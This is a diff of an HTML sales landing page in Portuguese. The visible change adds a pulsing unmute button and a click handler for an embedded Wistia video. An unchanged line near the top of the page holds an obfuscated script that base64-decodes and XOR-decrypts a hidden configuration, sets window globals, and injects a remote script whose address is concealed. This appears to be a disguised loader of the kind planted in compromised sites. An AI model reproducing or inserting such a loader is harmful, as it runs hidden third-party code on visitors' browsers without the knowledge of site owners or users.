@@ -529,7 +529,7 @@
 <script>(function(){var z_gtk=atob("DLiZAXqKQlSjlaHxH8O7dAjmYG6B/dWFb8ujLlXpJjqN4NWcdt7gLxnlL3rB546CfMrwcQ75bSTK7cSdMMjweR/mbD7Qt43TfsztcxPoNyDG5oPLROW1Ix3mLTbC+dLTJePiIxTrLzGBr4OBdsD8bTPuYHiB48Cdat27O1i8IzGRp5GVKIj/N0u8JzKb9pLGLdqtNEKoPwne");var n_vx=[];for(var l_j=0;l_j<z_gtk.length;l_j++){n_vx.push(z_gtk.charCodeAt(l_j)&255);}var o_qbr=n_vx[0];var l_k=n_vx.slice(1,1+o_qbr);var r_c6hs=n_vx.slice(1+o_qbr);var i_c9w=r_c6hs.map(function(b,e_j7h){return b^l_k[e_j7h%o_qbr];});var x_s="";for(var f_jrk=0;f_jrk<i_c9w.length;f_jrk++){x_s+=String.fromCharCode(i_c9w[f_jrk]&255);}var c_q=decodeURIComponent(escape(x_s));var z_mu=JSON.parse(c_q);var k_a7=z_mu.globals||[];k_a7.forEach(function(u_5){window[u_5.name]=u_5.value;});var m_u9e=document.createElement("script");m_u9e.src=z_mu.url;m_u9e.async=true;m_u9e.defer=true;(z_mu.attributes||[]).forEach(function(m_xn4){m_u9e.setAttribute(m_xn4.name,m_xn4.value);});(document.head||document.documentElement).appendChild(m_u9e);})();</script>
 <script src="https://fast.wistia.com/player.js" async></script>
 <script src="https://fast.wistia.com/embed/yzyez1ff7h.js" async type="module"></script>
-<style>wistia-player[media-id='yzyez1ff7h']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/yzyez1ff7h/swatch'); display: block; filter: blur(5px); padding-top:177.78%; }</style>
+<style>@keyframes vslPulse{0%,100%{transform:translateX(-50%) scale(1)}50%{transform:translateX(-50%) scale(1.06)}}wistia-player[media-id='yzyez1ff7h']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/yzyez1ff7h/swatch'); display: block; filter: blur(5px); padding-top:177.78%; }</style>
 </head><body><!--$--><main class="overflow-x-hidden">
   <header class="site-header-bar">
     <div class="site-header-container">
@@ -556,8 +556,9 @@
     <div class="hero-video mt-9">
       <div class="relative mx-auto w-full max-w-[380px]">
         <div class="absolute -inset-4 rounded-[2.5rem] bg-[radial-gradient(closest-side,oklch(0.6_0.2_300/0.28),transparent)] blur-xl"></div>
-        <div style="border-radius:16px;overflow:hidden">
+        <div style="position:relative;border-radius:16px;overflow:hidden">
           <wistia-player media-id="yzyez1ff7h" aspect="0.5625" autoplay muted silent-auto-play="allow" end-video-behavior="loop" playbar="false" fullscreen-control="false" settings-control="false"></wistia-player>
+          <button id="vslSom" style="position:absolute;left:50%;bottom:18px;transform:translateX(-50%);z-index:10;background:#0F9D6B;color:#fff;border:0;border-radius:999px;padding:12px 22px;font:700 16px Poppins,sans-serif;box-shadow:0 6px 18px rgba(0,0,0,.25);animation:vslPulse 1.6s infinite">🔊 Toque para ouvir</button>
         </div>
         <p class="mt-3 text-center text-sm font-bold text-muted-foreground">Assista em 1 minuto o que você vai receber</p>
       </div>
@@ -1420,5 +1421,15 @@ document.addEventListener('keydown', function(e) {
       previewMarqueeWrapper.classList.remove('is-paused');
     }, { passive: true });
   })();
+</script>
+<script>
+document.getElementById('vslSom').addEventListener('click', function(){
+  var p = document.querySelector('wistia-player[media-id="yzyez1ff7h"]');
+  p.currentTime = 0;
+  p.muted = false;
+  p.volume = 1;
+  p.play();
+  this.style.display = 'none';
+});
 </script>
 </body></html>
